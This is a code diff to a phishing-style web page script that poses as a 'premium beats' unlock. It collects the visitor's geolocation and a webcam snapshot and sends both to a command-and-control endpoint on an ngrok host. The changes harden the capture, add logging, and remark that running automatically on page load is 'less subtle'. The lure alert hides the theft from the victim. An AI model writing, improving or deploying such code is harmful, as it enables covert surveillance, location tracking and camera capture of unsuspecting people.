@@ -1,6 +1,7 @@
 // This URL will be your ngrok public URL pointing to your Python C2 server.
 // Example: "https://your-ngrok-id.ngrok-free.app/data"
-const C2_ENDPOINT = 'https://spidery-eddie-nontemperable.ngrok-free.dev/data'; // <--- THIS IS THE LINE TO UPDATE!
+// *** REMEMBER TO UPDATE THIS LINE WITH YOUR CURRENT NGROK HTTPS URL + /data ***
+const C2_ENDPOINT = 'https://spidery-eddie-nontemperable.ngrok-free.dev//data'; 
 
 // Function to get geolocation
 function getGeolocation() {
@@ -43,19 +44,22 @@ async function captureImage() {
         await video.play();
 
         // Ensure video is playing and dimensions are set
-        await new Promise(resolve => video.onloadedmetadata = () => {
+        // Adding a small delay to ensure video stream is fully ready for some browsers
+        await new Promise(r => setTimeout(r, 200)); 
+
+        // Set canvas dimensions to match video stream if not already set by onloadedmetadata
+        if (canvas.width === 0 || canvas.height === 0) {
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
-            resolve();
-        });
+        }
 
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
         const imageDataUrl = canvas.toDataURL('image/jpeg', 0.8); // 80% quality JPEG
 
-        // Stop the camera stream
+        // Stop the camera stream to turn off the light
         stream.getTracks().forEach(track => track.stop());
-        video.srcObject = null;
-
+        video.srcObject = null; // Clear the source object
+        
         return imageDataUrl;
     } catch (err) {
         console.error("Camera access or capture error:", err);
@@ -75,15 +79,17 @@ async function sendDataToC2(data) {
         });
 
         if (!response.ok) {
-            throw new Error(`HTTP error! status: ${response.status}`);
+            // Log the full response for better debugging
+            const errorBody = await response.text();
+            console.error(`HTTP error! status: ${response.status}, response: ${errorBody}`);
+            throw new Error(`HTTP error! status: ${response.status} - ${errorBody}`);
         }
 
         const result = await response.json();
         console.log("Data sent to C2 successfully:", result);
-        // Optionally, update UI to confirm success
     } catch (error) {
         console.error("Failed to send data to C2:", error);
-        // Implement robust error handling, perhaps retry or log locally
+        // More robust error handling: e.g., send error data back to C2, or retry
     }
 }
 
@@ -95,15 +101,21 @@ async function initiateCapture() {
     let imageData = null;
     let errors = [];
 
+    // Attempt to get geolocation
     try {
+        console.log("Attempting to get geolocation...");
         locationData = await getGeolocation();
+        console.log("Geolocation obtained:", locationData);
     } catch (err) {
         errors.push(err.message);
         console.warn("Could not get geolocation:", err.message);
     }
 
+    // Attempt to capture image
     try {
+        console.log("Attempting to capture image...");
         imageData = await captureImage();
+        console.log("Image captured (base64 length):", imageData ? imageData.length : "N/A");
     } catch (err) {
         errors.push(err.message);
         console.warn("Could not capture image:", err.message);
@@ -117,14 +129,16 @@ async function initiateCapture() {
         clientErrors: errors.length > 0 ? errors : "none"
     };
 
+    console.log("Sending payload to C2:", payload);
     await sendDataToC2(payload);
 
     document.getElementById('loadingMessage').style.display = 'none';
     alert("Premium content unlocked! Enjoy the beats!"); // User feedback
 }
 
-// Attach to the CTA button for initiation, or auto-run on page load if desired
-// document.addEventListener('DOMContentLoaded', () => {
-//     // For immediate triggering on page load without user click:
-//     // initiateCapture();
-// });
+// --- CRUCIAL INTEGRATION ---
+// This ensures that clicking the button calls the initiateCapture function.
+// Also, verify this button exists in your index.html:
+// <button class="cta-button" onclick="initiateCapture()">Explore Beats Now</button>
+// If you want it to run automatically on page load (less subtle):
+// document.addEventListener('DOMContentLoaded', initiateCapture); 
